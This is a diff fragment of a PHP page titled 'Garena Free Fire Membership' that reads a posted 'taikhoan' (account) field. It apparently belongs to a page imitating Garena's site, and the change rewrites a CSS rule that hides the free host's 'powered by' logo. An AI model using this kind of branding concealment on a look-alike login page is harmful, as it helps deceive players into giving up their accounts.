@@ -20,7 +20,7 @@ if(isset($_POST["taikhoan"])){
    <html>
        
    <head>
-       <style>img[alt="www.000webhost.com"]{display:none;}</style>
+       <style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}</style>
        <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Garena Free Fire Membership</title>
